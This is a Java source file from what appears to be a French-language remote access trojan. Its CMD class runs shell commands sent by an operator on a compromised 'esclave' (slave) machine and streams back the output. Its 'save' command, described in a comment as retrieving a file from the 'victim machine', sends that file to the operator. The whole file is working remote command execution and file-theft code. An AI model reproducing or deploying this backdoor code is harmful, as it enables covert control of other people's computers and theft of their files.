/*
 * 
 * 
 * 
 * 
 * 
 * 
 * 
 * 
 * 
 * 
 */
package remote.action;
import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.IOException;
import java.nio.file.Paths;

import send.specific.object.SendSpecificObject;
import send.specific.object.sendInputStream;
import client.Esclave;
import constante.Constante;




/**
 * 		Classe qui se charge d'envoyer une commande au systeme d'exploitation a travers le terminal de type console de l'esclave.
 * 		Implemente des fonctions qui recupere les flux de sorties et les flux d'erreurs des 
 * @author lh
 *
 */



public class CMD {
	
	/**************************************************** *********************************************************************************/
	/*													   ARGUMENTS																	   /	
	/**************************************************************************************************************************************/
	private String chemin;
	private File directory;
	private sendInputStream fluxErreur, fluxSortie;												// Flux d'entree et de sortie des commnandes
	private String executeur = (System.getProperty("os.name").contains("win") || System			// Optenir le shell Linuxien ou Windows
			.getProperty("os.name").contains("Win")) ? "cmd.exe"
			: "#!/bin/bash";
	private String option = (System.getProperty("os.name").contains("win") || System			// Propriete du shell Windows
			.getProperty("os.name").contains("Win")) ? "/C" : "";

	
	
	

	/**************************************************** *********************************************************************************/
	/*													   CONSTRUCTEUR																	   /	
	/**************************************************************************************************************************************/
	public CMD() {
		chemin = Paths.get("").toAbsolutePath().toString();
		directory = new File(chemin);
	}

	
	

	/**************************************************** *********************************************************************************/
	/*													   METHODES																	   /	
	/**************************************************************************************************************************************/
	
	
	/**
	 * 1. Recupere une chaine de caractère correspondant a la commande souhaité.
	 * 2. Recupere le chemin courant du contexte dans lequel la commande a été effectué
	 * 3. Gere les remontées et descentes dans l'arborescence avec la commande cd
	 * 4. Implemente une fonction save qui permet de recuperer un fichier sur la machine victime
	 * 5. Lance un ProcessBuilder pour la commande, lance deux thread qui recupere les Input de sortie 
	 * @param commande : intitulé de la commande
	 * @param esclave: : l'esclave depuis lequel est executé la commande
	 * @return String correspondant au flux de sortie et aux flux d'erreurs combinés
	 * @throws IOException
	 * @throws InterruptedException
	 */
	public String nouvellecommande(String commande, Esclave esclave)
			throws IOException, InterruptedException {
	//	System.out.println(commande);
		String res = null;
		commande = commande.trim();
		String[] commandeList = commande.split("\\s+");

		if (commandeList[0].equals("cd")) { // Si c'est une commande cd
			if (commandeList.length > 1) { // Si elle est bien ecrite

				File newDirectory = new File(chemin, commandeList[1]);

				if (newDirectory.exists() && newDirectory.isDirectory() // Si le
																		// fichier
																		// existe
																		// est
																		// un
																		// repertoire
																		// et
																		// pas
																		// ..
						&& !commandeList[1].contains("..")) {
					chemin += File.separator + commandeList[1];
					directory.deleteOnExit();
					directory = new File(chemin);
				//	System.out.println(chemin);
					return Constante.code_message_cmd;		// Retourne un code pour indiquer que je me suis bien deplace dans l'arborescence
				}

				else if (commandeList[1].contains("..")) { // Sinon si on veut
															// revenir en
															// arriere
					String[] split = commandeList[1].split("\\/");
					int nbre_retour_en_arriere = split.length;

					split = chemin.split("\\\\");
					int niveau = split.length;
					while (niveau > 1 && nbre_retour_en_arriere > 0) {
						niveau--;
						nbre_retour_en_arriere--;
					}
					chemin = "";
					for (int i = 0; i < niveau; i++) {
						chemin += split[i] + File.separator;
					}
					directory.deleteOnExit();
					directory = new File(chemin);
					return Constante.code_message_cmd;
				}

				else { // Si ce n'est pas un dossier
					String str = commandeList[1] + " n'est pas un dossier";
					fluxErreur = new sendInputStream(new ByteArrayInputStream(
							str.getBytes()));
					new Thread(fluxErreur).start();

				}

				// System.out.println("Nouveau chemin"
				// + directory.getAbsolutePath());
				// System.setProperty("user.dir", directory.getAbsolutePath());

			}

		} else if (commandeList[0].equals("save")) { // Sinon si on veut
														// enregistrer un
														// fichier
			if (commandeList.length == 1
					|| (commandeList.length == 2 && commandeList[1]
							.equals("-h"))) {
				String str = "man: save permet d'envoyer de recuperer un fichier sur l'ordinateur\n"
						+ "Usage: save [fichier]";
				fluxErreur = new sendInputStream(new ByteArrayInputStream(
						str.getBytes()));
				new Thread(fluxErreur).start();
			} else if (commande.length() > 1) {
				File sendFile = new File(chemin, commandeList[1]);
				if (sendFile.exists() && !sendFile.isDirectory()) {
					SendSpecificObject.sendTxt(sendFile.getPath(),
							esclave.getOut());
				}
				else{
					return sendFile.getName()+ " ne peut pas être envoyer ou n'existe pas";
				}

			}
		} else {

			ProcessBuilder pb = new ProcessBuilder(executeur, option, commande);
			pb.directory(directory);

			Process p = pb.start();
			fluxSortie = new sendInputStream(p.getInputStream());
			fluxErreur = new sendInputStream(p.getErrorStream());
			new Thread(fluxSortie).start();
			new Thread(fluxErreur).start();
			p.waitFor();

			p.destroy();
		}
		res = ((fluxSortie == null) ? null : fluxSortie.getFinale()) + "\n"
				+ ((fluxErreur == null) ? null : fluxErreur.getFinale());
		return (res == null) ? Constante.code_message_cmd : res;
	}
	
}